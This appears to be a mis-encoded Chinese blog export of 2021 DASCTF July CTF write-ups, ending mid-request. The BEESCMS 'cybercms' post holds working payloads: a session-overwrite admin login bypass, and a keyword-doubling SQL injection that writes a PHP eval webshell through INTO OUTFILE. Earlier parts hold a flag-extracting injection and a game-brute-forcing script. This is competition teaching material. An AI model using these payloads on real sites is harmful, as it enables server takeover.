'è¯·è¾“å…¥ç™»å½•å¯†ç ', trigger: 'blur'}], pay_password: [{required: true, message: 'è¯·è¾“å…¥æ”¯ä»˜å¯†ç ', trigger: 'blur'}] }, visibility: \"visibility: hidden\" } }, methods: { onSubmit() { axios .post('register', { username: app.users.username, password: md5(app.users.password+\"CBCTF\"), pay_password: encrsa(app.users.pay_password) }) .then(response =&gt; { if (response.data.error) { if (response.data.msg === \"hacker!\") { this.visibility = \"visibility: visible\"; } else { this.visibility = \"visibility: hidden\"; } app.$message({ showClose: true, message: response.data.msg, type: 'error' }); } else { window.location.href = 'login' } }) .catch(function (error) { // è¯·æ±‚å¤±è´¥å¤„ç† console.log(error); }); }, } }); function encrsa(input) { const crypt = new JSEncrypt(); const pub_key = \"-----BEGIN PUBLIC KEY-----\\n\" + \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDK9H5CoNfCA0TR5e5w20Q9qmTW\\n\" + \"3T1uWmLHmNu7id9VBsngYXbaNfcK01JK2NNLLQ74vbRTpnAFg05csCkUWnkloKKu\\n\" + \"AZZEDxKaiZ6M4Vmy1BYae7lutS5uECYouZt+TveABrdM4pjPxBwoKpp+IJFeYsVX\\n\" + \"UGzrDiFb40I47X6oRQIDAQAB\\n\" + \"-----END PUBLIC KEY-----\" crypt.setPublicKey(pub_key); return crypt.encrypt(md5(input+\"CBCTF2021\")) } æ ¹æ®å‰ç«¯æºç ï¼Œå¯¹æ”¯ä»˜å¯†ç è¿›è¡Œäº† md5 =&gt; rsa =&gt; base64 çš„åŠ å¯†ã€‚ ç›´æ¥æ³¨å…¥å‘ç°æ³¨ä¸è¿›å»ï¼Œè€ƒè™‘åˆ°æœ‰å¯èƒ½åç«¯å­˜çš„å°±æ˜¯æ”¯ä»˜å¯†ç çš„ md5 ç»“æœï¼Œäºæ˜¯å¯ä»¥æ”¹ä¸€æ”¹è¿™ä¸ª encrsa å‡½æ•°ï¼Œåœ¨ md5 ä¹‹åã€RSA ä¹‹å‰è¿›è¡Œæ³¨å…¥ã€‚ æ ¹æ® hintï¼Œpay_password åé¢è¿˜æœ‰ä¸€ä¸ª flag_num å­—æ®µï¼Œæ„é€  payload ä¸º 0a8b5a33639258fd9476bb66d3b7202d',233)-- ç™»å½•ä¹‹åå¯ä»¥å‘ç°æ”¹æˆåŠŸäº†ã€‚ äºæ˜¯å†æ„é€  0a8b5a33639258fd9476bb66d3b7202d',hex((select flllllllag from flaaaaaaaaag)))-- ç›´æ¥ç”¨æµè§ˆå™¨åœ¨æ³¨å†Œé¡µé¢æ‰§è¡Œä¸‹é¢çš„ js ä»£ç ã€‚ function encrsa(input) { const crypt = new JSEncrypt(); const pub_key = \"-----BEGIN PUBLIC KEY-----\\n\" + \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDK9H5CoNfCA0TR5e5w20Q9qmTW\\n\" + \"3T1uWmLHmNu7id9VBsngYXbaNfcK01JK2NNLLQ74vbRTpnAFg05csCkUWnkloKKu\\n\" + \"AZZEDxKaiZ6M4Vmy1BYae7lutS5uECYouZt+TveABrdM4pjPxBwoKpp+IJFeYsVX\\n\" + \"UGzrDiFb40I47X6oRQIDAQAB\\n\" + \"-----END PUBLIC KEY-----\" crypt.setPublicKey(pub_key); return crypt.encrypt(\"0a8b5a33639258fd9476bb66d3b7202d',\" + input + \")--\"); } axios .post('register', { username: \"miao\", password: md5(\"miao\" + \"CBCTF\"), // pay_password: encrsa(\"233\") // åœ¨è¿™é‡Œæ³¨å…¥ pay_password: encrsa(\"hex((select flllllllag from flaaaaaaaaag))\") // åœ¨è¿™é‡Œæ³¨å…¥ }) .then(response =&gt; { if (response.data.error) { if (response.data.msg === \"hacker!\") { this.visibility = \"visibility: visible\"; } else { this.visibility = \"visibility: hidden\"; } app.$message({ showClose: true, message: response.data.msg, type: 'error' }); } else { window.location.href = 'login' } }) .catch(function (error) { // è¯·æ±‚å¤±è´¥å¤„ç† console.log(error); }); ç„¶å hex è§£ç ä¸€ä¸‹å°±å®Œäº‹äº†ã€‚ å¦å¤–ï¼Œå¯ä»¥æ ¹æ®æ•°æ®åº“ç‰ˆæœ¬çš„è¯­å¥æ¥åˆ¤æ–­æ•°æ®åº“ç±»å‹ï¼š Mysql version()ã€Sqlserver @@VERSIONã€Sqlite sqlite_version() æç¤º hacker å¯èƒ½æ˜¯åç«¯æ‰§è¡Œå‡ºé”™äº†ï¼Œè€Œ sqlite_version() æˆåŠŸæ‰§è¡Œï¼Œè¯´æ˜æ˜¯ sqliteï¼Œç‰ˆæœ¬æ˜¯ 3.27.2ã€‚ å””ï¼Œå…¶å®ä¸ç”¨ hex ä¹Ÿå¯ä»¥çš„â€¦â€¦ Miscred_vs_blue çº¢é˜Ÿå’Œè“é˜Ÿå°†å¼€å±•66è½®å¯¹æŠ—ï¼Œä½ èƒ½é¢„æµ‹å‡ºæ¯è½®å¯¹æŠ—çš„ç»“æœå—ï¼Ÿ å‘ç°ä»–è¿™ä¸ªè®°å½•åœ¨ä¸€ä¸ª session é‡Œæ˜¯å›ºå®šä¸å˜çš„ï¼Œå†™ä¸ªè„šæœ¬è®°å½•ä¸€ä¸‹ï¼Œé”™äº†é‡è¯•å°±å®Œäº‹äº†ã€‚ ï¼ˆå°±æ˜¯æœ‰ç‚¹éº»çƒ¦ï¼Œè„šæœ¬å†™çš„æœ‰ç‚¹ä¸‘ï¼Œè¿˜è°ƒäº†è€åŠå¤©â€¦â€¦è¿˜æ˜¯å¤ªèœäº†ï¼Œå”‰ \"\"\" MiaoTony \"\"\" from pwn import * import re from time import sleep # context.log_level = 'debug' context.timeout = 10 # sh = remote('node4.buuoj.cn', 25451) sh = remote('117.21.200.166', 25451) choices = ['']*100 cnt = 0 c = 0 sh.recvuntil( 'To get the flag if you predict the results of all games successfully!\\n') retry = False while True: sh.recvuntil('Game ') n = int(sh.recvuntil('\\n').strip()) print('===&gt; n:', n) sh.recvuntil('choose one [r] Red Team,[b] Blue Team:\\n') choice = choices[n] if choice: retry = True else: choice = 'b' retry = False sh.sendline(choice) for _ in range(2): sh.recvline() x = sh.recvline().decode() # print('====&gt; x:', x) if 'successful' in x: c = re.findall(r'The number of successful predictions (\\d+)', x) c = int(c[0]) print('=====&gt; successful cnt:', c) cnt += 1 choices[n] = choice # if not retry: # choices += choice print('=====------------------&gt;&gt;&gt; choices:', ''.join(choices)) elif 'Sorry!You are wrong!' in x: sh.sendlineafter('Play again? (y/n): ', 'y') choice = 'b' if choice == 'r' else 'r' choices[n] = choice print('=====--------&gt;&gt;&gt; choices:', ''.join(choices)) cnt = 0 if cnt == 66: break # sleep(0.01) sh.interactive() é—®å·é¢˜DASCTF{79f3bb47a2e2d46def82c052eccb7b80} ezSteganographyåˆæ˜¯å¼€å±€ä¸€å¼ å›¾ã€‚ Red 0 æœ‰çº¿ç´¢ Green å¹³é¢ä¸€çœ‹å°±æœ‰éšå†™ æå–å¾—åˆ°ä¸€å¼ å›¾ qim quantization åˆ©ç”¨ VoIP ç¼–ç å™¨çš„ç æœ¬ç¼–ç ç‰¹æ€§åˆ’åˆ†ç æœ¬æ¥éšè—ä¿¡æ¯çš„æ–¹æ³•å«åšé‡åŒ–ç´¢å¼•è°ƒåˆ¶QIM éšå†™ï¼šæŒ‰ç…§è¯­éŸ³ç¼–ç æœ¬æ¥çš„åŸåˆ™å°†ç æœ¬ä»¥æŸç§è§„åˆ™åˆ’åˆ†å¹¶é€‰æ‹©æ¬¡ä¼˜å‚æ•°æ¥åµŒå…¥ç§˜å¯†ä¿¡æ¯ã€‚ å‚è€ƒäº† GitHub ä¸Šçš„ QuantizationIndexModulation ç¨å¾®æ”¹äº†ä¸€ä¸‹ \"\"\"Implementation of QIM method from Data Hiding Codes, Moulin and Koetter, 2005\"\"\" from __future__ import print_function import sys import os # HOME = os.environ[\"HOME\"] import numpy as np from PIL import Image import matplotlib.pyplot as plt class QIM: def __init__(self, delta): self.delta = delta def embed(self, x, m): \"\"\" x is a vector of values to be quantized individually m is a binary vector of bits to be embeded returns: a quantized vector y \"\"\" x = x.astype(float) d = self.delta y = np.round(x/d) * d + (-1)**(m+1) * d/4. return y def detect(self, z): \"\"\" z is the received vector, potentially modified returns: a detected vector z_detected and a detected message m_detected \"\"\" shape = z.shape z = z.flatten() m_detected = np.zeros_like(z, dtype=float) z_detected = np.zeros_like(z, dtype=float) z0 = self.embed(z, 0) z1 = self.embed(z, 1) d0 = np.abs(z - z0) d1 = np.abs(z - z1) gen = zip(range(len(z_detected)), d0, d1) for i, dd0, dd1 in gen: if dd0 &lt; dd1: m_detected[i] = 0 z_detected[i] = z0[i] else: m_detected[i] = 1 z_detected[i] = z1[i] z_detected = z_detected.reshape(shape) m_detected = m_detected.reshape(shape) return z_detected, m_detected.astype(int) def random_msg(self, l): \"\"\" returns: a random binary sequence of length l \"\"\" return np.random.choice((0, 1), l) def get_flag(): delta = 20 # quantization step qim = QIM(delta) img = Image.open('ezSteganography-flag.png') img = np.array(img) # plt.imshow(img) # plt.show() print(img.shape) # (1440, 2560, 3) R, G, B = img[:, :, 0], img[:, :, 1], img[:, :, 2] z_detected, msg_detected = qim.detect(G) # plt.imshow(z_detected) plt.imshow(msg_detected) plt.show() def main(): get_flag() if __name__ == \"__main__\": sys.exit(main()) Nuclear wastewater å°æ˜å»æ—¥æœ¬æ—…æ¸¸æ—¶ï¼Œå‘ç°äº†ä¸€å¼ è¢«æ ¸åºŸæ°´æ±¡æŸ“è¿‡çš„äºŒç»´ç ï¼Œä½ èƒ½ä»ä¸­å‘ç°ä»€ä¹ˆä¿¡æ¯å—ã€‚ ![Nuclear wastewater](CTF_2021DASCTF_July/Nuclear wastewater.png) å†™ä¸ªè„šæœ¬æå–å‡ºæ¯ä¸ªåƒç´ çš„é¢œè‰²ï¼Œå¯ä»¥å‘ç° rgb ä¸­åªæœ‰ä¸€ä¸ªé€šé“æœ‰æ•°å€¼ã€‚ chr è¯»ä¸€ä¸‹ã€‚ from typing import Counter from PIL import Image img = Image.open('Nuclear wastewater.png') print(img.size) # (230, 230) w, h = img.size data = [] for i in range(0, w): for j in range(0, h): r, g, b = img.getpixel((i, j)) if (r, g, b) == (255, 255, 255): continue else: # print(r, g, b) for x in (r, g, b): if x != 0: data.append(chr(x)) # print(''.join(data)) r = Counter(data) info = r.most_common() print(''.join([x[0] for x in info])) # theKEYis:#R@/&amp;p~!(\u001a?Â£Ã±$\u0004ÂªVÂ™ÂJÃÃFjÂ“Â‡Ã€\u0016ÃˆÃ·Â¢Â©Â¼Â§U\u0015ÂÃŒÂ€Â¦ÃµÂ±Â·Ã°Ã¤Ã´Ã‰\u000eCS2Ãš\u0010ÂHÃ&gt;Ã\u0013 å¾—åˆ°å‹ç¼©åŒ…å¯†ç  #R@/&amp;p~!ï¼Œé‡Œé¢å†…å®¹ä¸º â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€â€â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€â€â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€â€â€â€Œâ€â€Œâ€â€Œâ€Œâ€â€â€â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€â€â€â€Œâ€â€â€Œâ€Œâ€Œâ€â€â€â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€â€â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€â€â€Œâ€Œâ€â€Œâ€â€â€â€â€Œâ€Œâ€â€Œâ€â€Œâ€Œâ€â€â€â€â€Œâ€Œâ€â€Œâ€Œâ€â€â€Œâ€Œâ€â€â€â€Œâ€â€â€Œâ€â€Œâ€â€Œâ€Œâ€â€Œâ€Œâ€â€â€Œâ€â€â€Œâ€â€â€â€â€â€â€â€Œâ€â€Œâ€â€Œâ€â€â€â€â€Œâ€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€â€â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€Œâ€â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€â€Œâ€â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€â€Œâ€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€Œâ€â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€â€â€â€Œâ€Œâ€â€Œâ€Œâ€â€â€Œâ€â€Œâ€Œâ€â€Œâ€â€â€â€â€â€â€â€â€Œâ€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€â€â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€Œâ€Œâ€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€Œâ€Œâ€â€â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€â€â€â€Œâ€â€Œâ€â€Œâ€Œâ€Œâ€Œâ€â€Œâ€Œâ€Œâ€â€Œâ€â€â€â€Œâ€Œâ€â€â€OIENKMAJOLEOKMAJOHECLHBCPGFDLNBIPAFFLPBKPIFNLEBBPPFKLFBAPEFBLJBMPHFCLEBBPMFJLEBBPLFOLHBCPCFHLNBIPDFGLHBCPPFKLIBNPHFCLDBGPGFDLBBEPPFKLHBCPPFKLMBJPDFGLCBHPHFCLBBEPIFNLNBIPOFLLMBJPDFGLBBEPEFBLBBEPPFKLGBDPOFLLABFPMFJLABFPCFHLNBIPDFGLMBJPEFBLIBNPHFCLLBOPOFLLBBEPIFNLDBGPAFFKAAFOPEKKDAGOGEDKJAMOAEFKLAOOIENLIBNPEFBLLBOPJFMLFBAPLFOLFBAPNFILEBBPLFOLFBAPAFFLJBMPHFCLJBMPBFELIBNPHFCLIBNPNFILBBEPPFKKPAKOHECKMAJOAEFKKAPOIENKFAAOLEOKHACOPEKKAAFOPEKKAAFOFEAKJAMOHECKLAOODEGKMAJOAEFKPAKONEIKBAEOIENKAAFODEGKAAFOPEKKLAOOOELKJAMOAEFKGADOFEAKEABOLEOKOALOLEOKJAMOAEFKIANOLEOKIANOEEBKFAAOHECKBAEOIENKJAMOKEPKMAJPMFJLCBHPEFBLNBIâ€Œâ€â€Œâ€Œâ€Œâ€â€â€Œâ€â€Œâ€â€Œâ€â€Œâ€Œâ€Œâ€â€Œâ€â€â€â€â€Œâ€â€â€â€Œâ€Œâ€â€â€â€Œâ€ å¯ä»¥å‘ç°æœ‰é›¶å®½å­—ç¬¦éšå†™ï¼ŒåŒ…å«äº† 200c 200d 200e http://330k.github.io/misc_tools/unicode_steganography.html Citrix CTX1 decode CryptoYusaçš„å¯†ç å­¦ç­¾åˆ°â€”â€”BlockTrické¢˜ç›®æºç  from Crypto.Cipher import AES import os def pad(a): size = (16-len(a)%16)%16 a += chr(size)*size return a iv = os.urandom(16) key = os.urandom(16) enc = AES.new(key,AES.MODE_CBC,iv) print(iv.encode('hex')) for _ in range(2): try: trick = raw_input(\"\") trick = pad(trick.decode('hex')) cipher = enc.encrypt(trick) if trick == cipher and trick != \"\" : with open(\"flag.txt\") as f: print(f.read()) exit() else: print(cipher.encode('hex')) print(\"Try again\") except: exit() AES MODE_CBCï¼Œéœ€è¦åŠ å¯†å‰åçš„ç»“æœç›¸åŒä¸”ä¸ä¸ºç©ºã€‚å¯ä»¥å‚è€ƒ CBC çš„åŸç†æ¡†å›¾ã€‚ è¿™é‡Œå°±æ˜¯ä¸¤è½® CBCï¼Œåªéœ€è¦æŠŠå‘è¿‡æ¥çš„å†è¿”å›å»ä¸¤æ¬¡å°±å®Œäº‹äº†ã€‚ åŸç†å¤§æ¦‚æ˜¯ï¼Œç¬¬ä¸€æ¬¡å°†åˆå§‹å‘é‡ IV ä¸è‡ªå·±è¿›è¡Œå¼‚æˆ–ï¼Œå¾—åˆ°ä¸€ç»„é›¶å‘é‡ï¼ŒæŠŠç»è¿‡ CBC åå¾—åˆ°çš„ cipher å†ä¸æœ¬èº«å¼‚æˆ–ä¹Ÿæ˜¯å¾—åˆ°é›¶å‘é‡ï¼Œè€Œè¿™ä¸ªåŠ å¯†å™¨å¯ä»¥çœ‹ä½œä¸€ç§è¾“å…¥åˆ°è¾“å‡ºçš„æ˜ å°„ï¼Œå¯¹äºåŒæ ·çš„é›¶å‘é‡è¾“å…¥ï¼Œç»“æœå°±ä¸€æ ·äº†ã€‚ å°ç»“è¿™ç¯‡å†™å¾—å¥½ç´¯å•Šâ€¦â€¦ å…¶å®è¿˜æ˜¯æŒºæœ‰å‘³é“çš„ï¼Œå­¦åˆ°äº†ä¸å°‘ã€‚ å–µå–µæ˜¯ fwï¼Œå–µå‘œå‘œå‘œï¼ˆ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/08/15/CTF_2021DASCTF_July/"},{"title":"CTF | 2021 DASCTF July cybercms ä¸€æ¢å†æ¢","text":"æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼šhttps://www.anquanke.com/post/id/250048 å¼•è¨€åœ¨å‰ä¸ä¹…ç»“æŸçš„ 2021 DASCTF July X CBCTF 4th æ¯”èµ›ä¸­ï¼Œæœ‰ä¸€é“åä¸º cybercms çš„ web é¢˜ç›®ã€‚ é¢„æœŸè§£æ˜¯ä»åå°ç™»å½•å¤„è¿›è¡Œ SQL æ³¨å…¥å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶è€Œå’±åœ¨åšé¢˜çš„æ—¶å€™å°è¯•äº†å¦ä¸€ç§æ€è·¯ï¼Œç”¨çš„æ˜¯åå°ç™»å½•ç»•è¿‡ &amp; æœ¨é©¬ä¸Šä¼ çš„æ‰“æ³•ã€‚ ç”±äºæ¯”èµ›çš„æ—¶å€™åŠå¤©æ‰“ä¸é€šå°±ååˆ†éš¾å—ï¼Œèµ›åè¿˜æ˜¯æƒ³ä¸æ˜ç™½å°±æ¥ç¨å¾®æ·±å…¥æ¢ç©¶äº†ä¸€ä¸‹ï¼Œç»è¿‡æ›²æŠ˜æœ€åç»ˆäºæˆåŠŸæ‰“é€šäº†ã€‚ è¿™ç¯‡å°±æ¥è®°å½•ä¸€ä¸‹åšè¿™é“é¢˜æ—¶å€™çš„å¿ƒè·¯å†ç¨‹å§â€¦â€¦ é¢˜ç›®åˆæ¢ cybercms èµ›åšCMSï¼Œåªä¸ºå®‰å…¨è€Œç”Ÿ Hint: ä¿¡æ¯æœé›†æ˜¯ä¸€ä¸ªwebæ‰‹å¿…å¤‡çš„æŠ€èƒ½ å¾ˆå¥½ï¼Œæ˜¯ BEESCMSï¼Œhead é‡Œçš„ description æ²¡æ”¹ï¼Œæ­£æ–‡é‡Œå…¶å®ä¹Ÿæ²¡æ”¹å®Œã€‚ ä»å®˜ç½‘æ‰¾åˆ°äº† å®˜æ–¹ V4.0 æºç ä¸‹è½½ ï¼ˆä¸è¿‡è²Œä¼¼æ²¡å•¥ç”¨ åæ¥å‘ç°è¿˜æ˜¯æœ‰ç”¨çš„ åå°ç™»å½•ç»•è¿‡ &amp; ä¸Šä¼ å‚è€ƒ ã€ä»£ç å®¡è®¡ã€‘ beescms å˜é‡è¦†ç›–æ¼æ´å¯¼è‡´åå°ç™»é™†ç»•è¿‡åˆ†æï¼Œ$_SESSION å¯ä»¥è¢«ä»»æ„è¦†ç›–ã€‚ POST / _SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999 ç„¶åç›´æ¥å¯ä»¥è®¿é—®åå°äº†ã€‚ http://xxxxxxxxxxx/admin/admin.php å‚è€ƒ ä»£ç å®¡è®¡å°±è¯¥è¿™ä¹ˆæ¥3 beescms getshell æŒ‰ç…§æ–‡ä¸­çš„æ€è·¯ï¼Œä¸Šä¼ ä¸€ä¸ªåç¼€ä¸º .php çš„ä¸€å¥è¯æœ¨é©¬ï¼Œå¹¶ä¿®æ”¹ Content-Type: image/png æ¥é€šè¿‡åç«¯å¯¹æ–‡ä»¶ç±»å‹çš„æ ¡éªŒã€‚ ç„¶è€Œå‘ç°ä»–æ–‡ä»¶ç›®å½•æ²¡æƒé™ä¸Šä¼ å•Šï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ­£å¸¸çš„å›¾ç‰‡ä¹Ÿæ˜¯å¦‚æ­¤â€¦â€¦ æºç æ³„éœ²éº»äº†ï¼Œåšåˆ°ä¸€åŠæ‰å‘ç°æœ‰ æºç æ³„éœ²ï¼Œ/www.zipâ€¦ diff å¤§æ³•å¥½å•Šï¼Œçœ‹æ¥å®˜æ–¹æºç è¿˜æ˜¯æœ‰ç”¨çš„ 2333ã€‚ å¤šäº†ä¸ª hackable/ ç›®å½•ï¼Œçœ‹èµ·æ¥åªæœ‰è¿™ä¸ªç›®å½•å¯å†™çš„æ ·å­ã€‚ï¼ˆè™½ç„¶æœ€åå‘ç°ä¹Ÿä¸è¡Œ ç™»å½•è¿˜è¿‡æ»¤äº†ä¸€ä¸‹ SQL æ³¨å…¥ã€‚ æ³¨æ„çš„æ˜¯è¿˜æŠŠ /* * çš„è¿‡æ»¤ç»™å»æ‰äº†ã€‚ ä¸Šä¼ ç‚¹æºç å®¡è®¡å†æ¥çœ‹ä¸Šä¼ éƒ¨åˆ†çš„æºç ã€‚ å®¡äº†ä¸€æ³¢æºç ï¼Œå‘ç°å…¶å®å¯ä»¥ æ„é€ ç›®å½•ç©¿è¶Šã€‚ $up_file_name2 ç”± $pic_alt è€Œæ¥ï¼Œè¿™ä¸ªæ˜¯å¯æ§çš„ï¼Œåªéœ€è¦æ„é€ ä¸ªç›®å½•ç©¿è¶Šåˆ° hackable ç›®å½•ä¸‹å°±å®Œäº‹äº†ã€‚ ä¸ºäº†è¿›åˆ°è¿™é‡Œï¼Œä¸Šä¼ çš„æ—¶å€™è®°å¾—å†æŠŠ Content-Type: image/png æ”¹å¥½ï¼Œ is_alt è®¾ä¸º 1ã€‚ ç„¶è€Œè¿˜æ˜¯æ²¡æ‰“é€šï¼ŒæŠ¥é”™å’Œä¸Šé¢çš„ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ PHP æ‰§è¡Œçš„æ—¶å€™æ–‡ä»¶ç›®å½•æ²¡æƒé™ï¼Œåªä¸è¿‡å¯ä»¥æ³¨æ„åˆ°æ–‡ä»¶åæ˜¯ .php äº†ã€‚ ï¼ˆå’±ä¹Ÿä¸çŸ¥é“ä¸ºå•¥ä»– $pic_alt æ²¡ä¼ è¿›æ¥ï¼Œç•™ç©ºçš„è¯ä¹Ÿä¸æ˜¯éšæœºæ•°ï¼Œä¸€è„¸æ‡µé€¼ å¦ä¸€ä¸ªä¸Šä¼ ç‚¹å®¡è®¡äºæ˜¯ä¹ˆå¾—åŠæ³•ï¼Œå†æŒ–äº†å¦ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç‚¹ï¼Œè€ƒè™‘é€šè¿‡ ä¿®æ”¹å·²ä¸Šä¼ å›¾ç‰‡çš„æ¥å£ æ¥è¿›è¡Œä¸Šä¼ ã€‚ ç›¸åº”æºç å¦‚ä¸‹ã€‚ è¿™é‡Œçš„ $pic_path å’Œ $pic_name éƒ½æ˜¯å¯æ§çš„ï¼Œä»»æ„æ”¹ä¸€ä¸ªå°±å®Œäº‹äº†ã€‚å½“ç„¶è¿™æ˜¯ PHP/5.6.40ï¼Œ%00 æˆªæ–­ä¸å¯è¡Œ 2333. ç„¶è€Œè¿˜æ˜¯æ‰“ä¸é€šâ€¦â€¦ ç»ç»å­ï¼ŒæŒ–äº†ä¸¤æ¡ä¸Šä¼ çš„è·¯ï¼Œè¯•ç€ç»•åˆ° hackable ç›®å½•ä¹Ÿæ‰“ä¸é€šâ€¦â€¦ çœ‹æ¥è¿˜æ˜¯æ–‡ä»¶ç›®å½•çš„é™åˆ¶å§ã€‚ å¿ƒæ€ç‚¸äº†å•Šå•Šå•Šå•Šå•Šã€‚ SQL æ³¨å…¥å†™é©¬ï¼ˆé¢„æœŸè§£ï¼‰å®³ï¼Œèµ›åçœ‹äº†çœ‹å¤§ä½¬çš„ wpï¼Œä¹ˆå¾—åŠæ³•ï¼Œè¿˜æ˜¯å¾—èµ° SQL æ³¨å…¥å†™å…¥æ–‡ä»¶å‘—ã€‚ï¼ˆä½›äº† å†æ¥çœ‹ä¸Šé¢ diff å‡ºæ¥çš„å…³äº SQL æ³¨å…¥çš„è¯­å¥ã€‚ function fl_value($str){ if(empty($str)){return;} return preg_replace('/select|insert | update | and | in | on | left | joins | delete |\\%|\\=|\\.\\.\\/|\\.\\/| union | from | where | group | into |load_file |outfile/i','',$str); } define('INC_BEES','B'.'EE'.'SCMS'); function fl_html($str){ return htmlspecialchars($str); } function f1_vvv($str){ if(empty($str)){return;} if(preg_match(\"/\\ /i\", $str)){ exit('Go away,bad hacker!!'); } preg_replace('/0x/i','',$str); return $str; } è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå€’æ˜¯æŠŠ /* è¿‡æ»¤å»æ‰äº†ï¼Œå¦å¤–æŠŠä¸€äº›å…³é”®è¯è¿‡æ»¤ä¸ºç©ºäº†ï¼ŒåŒå†™ç»•è¿‡å°±å®Œäº‹äº†ã€‚ æ ¹æ®ä»£ç é‡Œç™»å½•çš„ SQL è¯­å¥ $rel=$GLOBALS['mysql']-&gt;fetch_asc(\"select id,admin_name,admin_password,admin_purview,is_disable from \".DB_PRE.\"admin where admin_name='\".$user.\"' limit 0,1\"); æ„é€  SQL # select xxx into outfile xxx # &lt;?php eval($_REQUEST['m']);?&gt; admin'/**/uni union on/**/seselectlect/**/null,null,null,null,0x3c3f706870206576616c28245f524551554553545b276d275d293b3f3e/**/in in to/**/outoutfilefile/**/'/var/www/html/upload/miao.php'# ï¼ˆå’±ä¹Ÿä¸çŸ¥é“ä¸ºå•¥ 0x æ²¡è¢«è¿‡æ»¤ä¸ºç©ºï¼ŒåŒå†™ 0x å‘ç°å¹¶æ²¡æœ‰è¢«åˆ é™¤åè€Œ SQL æ‰§è¡ŒæŠ¥é”™äº† Payload: POST /admin/login.php?action=ck_login HTTP/1.1 user=admin%27%2F%2A%2A%2Funi%20union%20on%2F%2A%2A%2Fseselectlect%2F%2A%2A%2Fnull%2Cnull%2Cnull%2Cnull%2C0x3c3f706870206576616c28245f524551554553545b276d275d293b3f3e%2F%2A%2A%2Fin%20in%20to%2F%2A%2A%2Foutoutfilefile%2F%2A%2A%2F%27%2Fvar%2Fwww%2Fhtml%2Fupload%2Fmiao%2Ephp%27%23&amp;password=miao&amp;code=&amp;submit=true&amp;submit.x=43&amp;submit.y=24 å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ char å‡½æ•°å†™å…¥æœ¨é©¬ã€‚ admin'/**/uni union on/**/seselectlect/**/null,null,null,null,char(60,63,112,104,112,32,101,118,97,108,40,36,95,82,69,81,85,69,83,84,91,39,109,39,93,41,59,63,62)/**/in in to/**/outoutfilefile/**/'/var/www/html/upload/miao.php'# è¿›å»å‘ç°æœç„¶ MySQL å°±æ˜¯ root ç”¨æˆ·èµ·æ¥çš„ï¼Œäºæ˜¯å°±èƒ½å†™å…¥æ–‡ä»¶ã€‚ è€Œ PHP è¿è¡Œåœ¨ www-data ç”¨æˆ·ï¼Œ/var/www/html ç›®å½•æ˜¯ç»™ www-data ç”¨æˆ·äº†ï¼Œä½†å­ç›®å½•æ²¡é€’å½’å˜æ›´å±ä¸»ä¹Ÿæ²¡ç»™å†™å…¥æƒé™å°±ç¦»è°±ã€‚ $ ps -ef PID USER TIME COMMAND 1 root 0:07 /bin/sh /usr/local/bin/docker-php-entrypoint 10 root 0:21 /usr/bin/mysqld --user=root --skip-name-resolve --skip-networking=0 54 root 0:02 php-fpm: master process (/usr/local/etc/php-fpm.conf) 60 root 0:00 nginx: master process nginx 61 nginx 0:00 nginx: worker process 62 www-data 0:00 php-fpm: pool www 63 www-data 0:01 php-fpm: pool www 19798 root 0:00 sleep 5s 19799 www-data 0:00 ps -ef ä¹Ÿæœ‰å¯èƒ½é¢„æœŸè§£å°±åªæœ‰è¿™æ¡è·¯å¯èµ°å§ã€‚ æ°”æ­»äº†ï¼Œä¸‹æ¬¡ç›´æ¥ pyflag ç®—äº†ï¼ˆbushi ä¸Šä¼ ç‚¹å†æ¢å™¢å¯¹äº†ï¼Œå¯»æ€ç€å’±æŒ–äº†ä¸¤ä¸ªä¸Šä¼ ç‚¹éƒ½æ•´ä¸é€šï¼Œå®åœ¨è¿‡æ„ä¸å»å•Šã€‚ æ—¢ç„¶å‰é¢å‘ç°äº† www-data ç”¨æˆ·åªæœ‰ /var/html/www è¿™ä¸ªè·¯å¾„æœ‰æƒé™å†™å…¥ï¼Œå­ç›®å½•ä¹ˆæœ‰ï¼Œé‚£å¯ä»¥ ä¼ åˆ°è¿™ä¸ªç½‘ç«™çš„æ ¹ç›®å½• å•Šï¼ è¿™é‡Œç”¨çš„æ˜¯ä¿®æ”¹å›¾ç‰‡çš„æ¥å£ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢è¯´çš„ ç¬¬äºŒå¤„ä¸Šä¼ ç‚¹ã€‚ ä¸Šä¼ ä»¥åæŠ“åŒ…ä¿®æ”¹å‡ ä¸ªåœ°æ–¹ï¼Œçœ‹å›¾ã€‚ ä¹Ÿå°±æ˜¯è®© move_uploaded_file ç»“æœæ˜¯ç§»åŠ¨åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹ã€‚ POST /admin/admin_pic.php?nav=pic_list&amp;admin_p_nav=content HTTP/1.1 Host: a10f5ec3-1cae-476e-bb23-31ed556086dd.node4.buuoj.cn Content-Length: 